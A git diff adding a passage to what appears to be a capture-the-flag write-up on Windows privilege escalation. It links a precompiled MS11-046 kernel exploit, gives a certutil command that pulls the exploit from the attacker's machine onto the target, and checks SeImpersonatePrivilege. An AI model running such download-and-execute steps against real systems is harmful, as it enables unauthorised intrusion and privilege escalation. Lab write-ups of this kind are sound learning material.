@@ -137,11 +137,25 @@ Running the ```systeminfo``` command
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cb1c3ce-0253-4775-a317-b811473f08ad)
 
-That's an outdated kernel I think, checking for available exploits
+That's an outdated kernel I think, checking for available exploits, I found this
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe8265eb-d315-4f2e-9bda-0c68d3483a84)
 
+You can download the ```.exe``` exploit [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe)
 
+Download the exploit and send it over to the target machine
 
+command:```certutil -urlcache -f http://10.10.14.122/ms11-046.exe exploit.exe```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a8772ad-3256-44d9-8794-2709314d6cbe)
+
+oops, we are unable to run the command hehe.
+
+Moving on😅, running the command ```whoami /priv```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73f7870f-1161-4e00-9a75-319a23287d8e)
+
+As we can see ```SeImpersonatePrivilege``` is enabaled hehe
 
 
 
